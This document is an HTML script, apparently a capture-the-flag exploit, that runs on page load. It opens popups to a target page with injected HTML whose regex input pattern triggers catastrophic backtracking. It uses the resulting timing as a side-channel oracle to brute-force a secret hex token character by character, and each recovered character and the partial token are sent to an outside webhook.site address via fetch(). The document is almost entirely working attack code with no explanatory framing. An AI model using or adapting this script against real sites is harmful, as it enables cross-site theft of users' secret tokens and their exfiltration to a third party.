<script>
    function sleep(time) {
        return new Promise((resolve) => setTimeout(resolve, time));
    }
    function popup(url) {
        return window.open(url, "palle", "width=200,height=100");
    }

    async function oracle(tobrute) {
        let final_pattern = "^" + tobrute + "(([a-f0-9]+.)[a-f0-9])+$"

        console.log("PATTERN", final_pattern);
        let count = 30 + tobrute.length - 1;

        let html = `<input value="{{TOKEN}}${'a'.repeat(count)}!" pattern="${final_pattern}" />`;

        console.log(html)

        var w = popup("http://web:3000/?html=" + encodeURIComponent(html));
        await sleep(200); // Wait for the ReDoS to start
        w.location = "about:blank"
        var start = performance.now();
        await new Promise((resolve) => {
            let interval = setInterval(async () => {
            try {
                w.origin;
                clearInterval(interval);
                resolve();
            } catch (e) {
                // Do nothing, just wait for the next interval
            }
            }, 100);
        });

        //w.close();
        return performance.now() - start;
    }

    async function main() {
        let token = "";
        let charset = "abcdef0123456789";
        for (let i = 0; i < 12; i++) {
            for (let j = 0; j < charset.length; j++) {
                let c = charset[j];
                let tobrute = token + c;
                console.log("TRYING", tobrute)
                let time = await oracle(tobrute);
                await sleep(100);
                if (time > 500) {
                    token = token + c;
                    fetch("http://webhook.site/89c91014-0fbc-438a-9f54-36d7fa792030/?time=" + time + "&c=" + c + "&token=" + token);
                    break;
                }
            }
            await sleep(100);
        }
    }
    document.addEventListener("DOMContentLoaded", main);
</script>